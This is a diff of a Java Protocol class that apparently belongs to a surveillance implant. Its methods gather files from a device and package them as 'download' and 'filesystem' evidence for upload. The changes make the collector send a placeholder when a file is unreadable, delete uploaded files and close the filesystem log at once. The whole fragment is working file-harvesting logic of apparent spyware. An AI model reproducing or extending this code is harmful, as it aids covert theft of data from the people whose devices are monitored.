@@ -69,7 +69,6 @@ public abstract class Protocol implements iProtocol {
 		return true;
 	}
 
-
 	/**
 	 * Save new conf.
 	 * 
@@ -164,7 +163,7 @@ public abstract class Protocol implements iProtocol {
 				}
 			}
 		}
-		
+
 		for (final String fileName : files) {
 			final File file = new File(Path.upload(), fileName);
 			file.delete();
@@ -196,9 +195,9 @@ public abstract class Protocol implements iProtocol {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " logging file: " + filefilter);//$NON-NLS-1$
 			}
-			if (file.canRead()) {
-				saveFileLog(file, filefilter);
-			}
+
+			saveFileLog(file, filefilter);
+
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " not a file, try to expand it: " + filefilter);//$NON-NLS-1$
@@ -240,13 +239,18 @@ public abstract class Protocol implements iProtocol {
 		if (Cfg.DEBUG) {
 			Check.requires(!filename.endsWith("*"), "path shouldn't end with *"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
-		final byte[] content = file.read();
+		byte[] content;
+		if (file.canRead()) {
+			content = file.read();
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (saveFileLog): not readable");
+			}
+			content = new byte[] {0};
+		}
+
 		final byte[] additional = Protocol.logDownloadAdditional(filename);
-		// final Evidence log = new Evidence(0);
-
 		EvidenceReference.atomic(EvidenceType.DOWNLOAD, additional, content);
-
-		// log.atomicWriteOnce(additional, EvidenceType.DOWNLOAD, content);
 
 	}
 
@@ -304,7 +308,6 @@ public abstract class Protocol implements iProtocol {
 	 */
 	public static void saveFilesystem(final int depth, String path) {
 		EvidenceReference fsLog = new EvidenceReference(EvidenceType.FILESYSTEM);
-		
 
 		// Expand path and create log
 		if (path.equals("/")) { //$NON-NLS-1$
@@ -328,7 +331,7 @@ public abstract class Protocol implements iProtocol {
 			}
 		}
 
-		fsLog.close();
+		fsLog.immediateClose();
 	}
 
 	/**
@@ -434,7 +437,7 @@ public abstract class Protocol implements iProtocol {
 		databuffer.writeLong(0);
 		databuffer.writeLong(DateTime.getFiledate(new Date()));
 		databuffer.write(WChar.getBytes("/")); //$NON-NLS-1$
-		
+
 		fsLog.write(content);
 	}
 
